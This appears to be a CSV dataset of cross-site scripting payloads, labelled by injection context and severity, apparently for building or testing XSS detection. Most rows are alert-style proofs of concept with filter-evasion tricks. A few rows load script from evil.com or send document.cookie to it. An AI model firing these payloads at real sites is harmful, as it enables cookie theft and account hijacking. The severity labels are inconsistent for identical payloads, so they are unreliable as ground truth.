payload,context,severity
"eval(""al'+'ert(1)"")",script_injection,high
"eval(""al'+'ert(1)"")",dom_sink,medium
"eval(""al'+'ert(1)"")",dom_sink,medium
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,js_uri,low
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,js_uri,high
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,template_injection,low
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,attribute_escape,medium
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,script_injection,high
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,attribute,high
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,tag_injection,medium
<svg onload=alert(1)>,dom_sink,medium
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,tag_injection,medium
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,event_handler,low
<svg onload=alert(1)>,event_handler,medium
<svg onload=alert(1)>,attribute,medium
<svg onload=alert(1)>,html_body,medium
<svg onload=alert(1)>,event_handler,high
<img src/onerror=prompt(8)>,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
' ><img src=x onerror=alert(1)>,tag_injection,high
' ><img src=x onerror=alert(1)>,attribute,high
' ><img src=x onerror=alert(1)>,attribute,low
' ><img src=x onerror=alert(1)>,attribute,high
' ><img src=x onerror=alert(1)>,attribute,high
' ><img src=x onerror=alert(1)>,tag_injection,medium
' ><img src=x onerror=alert(1)>,attribute,high
' ><img src=x onerror=alert(1)>,attribute,low
' ><img src=x onerror=alert(1)>,attribute,medium
' ><img src=x onerror=alert(1)>,attribute,medium
' ><img src=x onerror=alert(1)>,attribute,low
' ><img src=x onerror=alert(1)>,attribute,low
' ><img src=x onerror=alert(1)>,attribute,medium
' ><img src=x onerror=alert(1)>,attribute,medium
' ><img src=x onerror=alert(1)>,attribute,low
' ><img src=x onerror=alert(1)>,attribute,high
' ><img src=x onerror=alert(1)>,tag_injection,high
' ><img src=x onerror=alert(1)>,js_uri,medium
' ><img src=x onerror=alert(1)>,attribute,low
' ><img src=x onerror=alert(1)>,attribute,low
"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,medium
"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
"<iframe src=""javascr/**/ipt:alert(1)"">",script_injection,medium
"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,attribute,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,attribute,medium
<svg onload=alert()>,attribute,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,html_body,medium
<svg onload=alert()>,attribute,medium
<svg onload=alert()>,html_body,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,high
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",event_handler,low
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,low
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",attribute,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,template_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
<SCRIPT>alert(1)</SCRIPT>,attribute,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,js_uri,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
<SCRIPT>alert(1)</SCRIPT>,event_handler,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
<SCRIPT>alert(1)</SCRIPT>,template_injection,low
onload='window.alert(1)',html_body,medium
\x3cbody onload=alert(1)\x3e,attribute_escape,low
\x3cbody onload=alert(1)\x3e,event_handler,medium
\x3cbody onload=alert(1)\x3e,tag_injection,high
' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
' oNmOuSeOvEr=aLeRt(1) ',attribute,high
' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
' oNmOuSeOvEr=aLeRt(1) ',tag_injection,low
' onerror=confirm(1) x=',attribute,high
' onerror=confirm(1) x=',attribute,medium
' onerror=confirm(1) x=',template_injection,high
"onload=""self.alert(1)""",html_body,medium
\' OnErRoR=AlErT(1)//,attribute_escape,high
\' OnErRoR=AlErT(1)//,attribute_escape,high
\' OnErRoR=AlErT(1)//,attribute_escape,medium
\' OnErRoR=AlErT(1)//,attribute_escape,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
\x3csvg onload=alert(1)\x3e,attribute_escape,high
\x3csvg onload=alert(1)\x3e,event_handler,medium
\x3csvg onload=alert(1)\x3e,attribute_escape,medium
OnLOAD='aLERt(1)',html_body,medium
"<ObJeCt dAtA=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
"<ObJeCt dAtA=""jAvAsCrIpT:AlErT(1)"">",tag_injection,low
onload='alert(1)',html_body,medium
onload='alert(1)',html_body,medium
onload='alert(1)',html_body,medium
onload='alert(1)',attribute,medium
onload='alert(1)',html_body,medium
onload='alert(1)',attribute,medium
onload='alert(1)',attribute,medium
onload='alert(1)',html_body,medium
onload='alert(1)',attribute,medium
onload='alert(1)',attribute,medium
onload='alert(1)',html_body,medium
onload='alert(1)',attribute,medium
onload='alert(1)',html_body,medium
onload='alert(1)',html_body,medium
onload='alert(1)',attribute,medium
onload='alert(1)',html_body,medium
onload='alert(1)',attribute,medium
javascript:alert(	1),tag_injection,medium
javascript:alert(	1),attribute,medium
javascript:alert(	1),js_uri,medium
"<details open ontoggle
=alert(	1)>",event_handler,medium
"<details open ontoggle
=alert(	1)>",event_handler,medium
"<details open ontoggle
=alert(	1)>",event_handler,low
"<details open ontoggle
=alert(	1)>",event_handler,high
"<details open ontoggle
=alert(	1)>",js_uri,medium
"<details open ontoggle
=alert(	1)>",event_handler,low
""" onload=confirm(1) x=""",attribute,high
""" onload=confirm(1) x=""",attribute,high
""" onload=confirm(1) x=""",attribute,low
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,high
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,low
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,low
"<iframe src=""javascript:confirm(1)"">",script_injection,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,low
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
"<iframe src=""javascript:confirm(1)"">",attribute,high
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
"<iframe src=""javascript:confirm(1)"">",template_injection,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
"onload=""print()""",html_body,medium
<%= al'+'ert(1) %>,template_injection,medium
<%= al'+'ert(1) %>,template_injection,medium
<%= al'+'ert(1) %>,template_injection,low
<%= al'+'ert(1) %>,template_injection,low
<%= al'+'ert(1) %>,template_injection,high
<%= al'+'ert(1) %>,template_injection,medium
"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,low
"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,medium
"sEtTiMeOuT(""aLeRt(1)"",0)",event_handler,medium
"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,medium
<%= confirm(1) %>,template_injection,high
<%= confirm(1) %>,template_injection,high
<%= confirm(1) %>,js_uri,medium
<%= confirm(1) %>,event_handler,low
<%= confirm(1) %>,attribute,high
<%= confirm(1) %>,js_uri,medium
<%= confirm(1) %>,template_injection,low
javascript:al'+'ert(1),js_uri,low
javascript:al'+'ert(1),js_uri,medium
javascript:prompt(1),url,medium
' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute,medium
' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute,low
' \x3e\x3cimg src=x onerror=alert(1)\x3e,js_uri,high
"location=""javascript:al'+'ert(1)""",dom_sink,high
"location=""javascript:al'+'ert(1)""",tag_injection,medium
"location=""javascript:al'+'ert(1)""",dom_sink,high
"location=""javascript:al'+'ert(1)""",dom_sink,low
j\u0061v\u0061script:confirm(1),js_uri,high
j\u0061v\u0061script:confirm(1),js_uri,medium
j\u0061v\u0061script:confirm(1),js_uri,medium
j\u0061v\u0061script:confirm(1),js_uri,high
j\u0061v\u0061script:confirm(1),js_uri,high
"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,low
<SCRIPT src=//evil.com/xss.js></SCRIPT>,dom_sink,low
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
"<embed src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",event_handler,high
"<embed src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",script_injection,medium
onload='confirm(1)',html_body,medium
pRoMpT(9),attribute,medium
"<object data=""javascript:confirm(1)"">",attribute_escape,low
"<object data=""javascript:confirm(1)"">",tag_injection,low
"<object data=""javascript:confirm(1)"">",tag_injection,high
"<object data=""javascript:confirm(1)"">",tag_injection,medium
"<object data=""javascript:confirm(1)"">",js_uri,medium
"<object data=""javascript:confirm(1)"">",tag_injection,low
"<object data=""javascript:confirm(1)"">",tag_injection,low
"<object data=""javascript:confirm(1)"">",tag_injection,low
"<object data=""javascript:confirm(1)"">",tag_injection,high
"location=""javaSCRIPT:alert(1)""",tag_injection,medium
"location=""javaSCRIPT:alert(1)""",dom_sink,medium
"""><svg onload=alert(1)>",html_body,medium
"""><svg onload=alert(1)>",attribute,medium
"""><svg onload=alert(1)>",attribute,medium
"""><svg onload=alert(1)>",attribute,medium
"""><svg onload=alert(1)>",html_body,medium
"""><svg onload=alert(1)>",attribute,medium
"""><marquee>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<script>document.location
=""http://evil.com/?c
=""+document.cookie</script>",script_injection,low
""" onload
=alert(	1) x
=""",attribute,medium
""" onload
=alert(	1) x
=""",attribute,low
""" onload
=alert(	1) x
=""",attribute,high
"//"";window.alert(1))",html_body,high
javascript:al'+'ert(document.domain),js_uri,low
prompt`1`,attribute,medium
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,high
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,medium
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,medium
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,low
"ONERRor=""AlerT(1)""",html_body,medium
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",script_injection,high
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",attribute,high
<body onload=al'+'ert(1)>,event_handler,high
<body onload=al'+'ert(1)>,event_handler,medium
<marquee onstart=confirm(1)>,script_injection,low
<marquee onstart=confirm(1)>,dom_sink,low
<marquee onstart=confirm(1)>,event_handler,low
<svg onload=confirm(1)>,event_handler,high
<svg onload=confirm(1)>,html_body,medium
"<marquee onstart
=alert(	1)>",event_handler,medium
"<marquee onstart
=alert(	1)>",event_handler,medium
;confirm`1`;,attribute,medium
"onerror=""alert(document.cookie)""",html_body,medium
"onerror=""alert(document.cookie)""",html_body,medium
"<SCRiPt>D.INNeRHtMl+='';</SCRipt>//[""'`-->]]>]</dIv>",attribute,high
""" onfocus=confirm(1) autofocus=""",script_injection,medium
ONLoaD='AleRt(1)',attribute,medium
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",template_injection,medium
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",tag_injection,low
"""><svG OnLoaD=ALerT(1)>",attribute,medium
"\""><img src
=x onerror
=alert(	1)>",attribute_escape,medium
<script>al'+'ert(document.domain)</script>,script_injection,high
<script>al'+'ert(document.domain)</script>,script_injection,high
""" onfocus=\u0061\u006cert(1) \u0061utofocus=""",attribute,medium
"""><iframe onload=alert(1);>",html_body,medium
<svg Onload=aleRT()>,html_body,medium
-alErT(23)/,attribute,medium
"<table>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<svg ONLoaD=ALeRt()>,attribute,medium
onsearch='alert(1)',attribute,medium
\u003e\u003cimg src=1 oncut=alert(0)\u003e,attribute,medium
"\' onerror
=alert(	1)//",attribute_escape,low
"\' onerror
=alert(	1)//",js_uri,low
\x3cvideo src=x onerror=alert(1)\x3e,event_handler,medium
#javascript:alert(1),url,medium
"document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>""",dom_sink,medium
"oNERROR=""alErT(1)""",html_body,medium
"ONlOAd=""ALErt(1)""",html_body,medium
